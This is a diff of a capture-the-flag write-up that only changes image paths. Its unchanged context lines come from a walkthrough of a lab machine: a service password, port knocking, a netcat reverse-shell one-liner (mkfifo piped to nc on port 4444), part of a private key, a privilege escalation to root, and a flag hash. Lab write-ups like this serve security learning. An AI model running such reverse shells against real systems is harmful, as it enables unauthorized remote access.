@@ -25,10 +25,10 @@ If we try interacting with the `4420` port, we need a password, for it, we can g
 sardinethecat
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612135655.png)
+![](Pasted image 20250612135655.png)
 But, before all of this, we need to go to the website in which we will find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612142859.png)
+![](Pasted image 20250612142859.png)
 
 The FTP port will appear as filter if we don't do `port knocking`, Port knocking is a security technique that involves a client making a series of connection attempts to specific closed ports on a server before a legitimate connection can be established, we need to do port knocking on the specified ports:
 
@@ -50,7 +50,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
 ```
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612135810.png)
+![](Pasted image 20250612135810.png)
 
 
 
@@ -121,7 +121,7 @@ O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
 
 We got our private key and can now connect to ssh:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612141930.png)
+![](Pasted image 20250612141930.png)
 # PRIVILEGE ESCALATION
 ---
 
@@ -225,7 +225,7 @@ exit
 
 Once the script runs again, we get a shell as root but in the real machine:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612143517.png)
+![](Pasted image 20250612143517.png)
 
 We can now get both flags:
 
@@ -240,5 +240,5 @@ Here is your flag:
 4a98e43d78bab283938a06f38d2ca3a3c53f0476
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612143705.png)
+![](Pasted image 20250612143705.png)
 
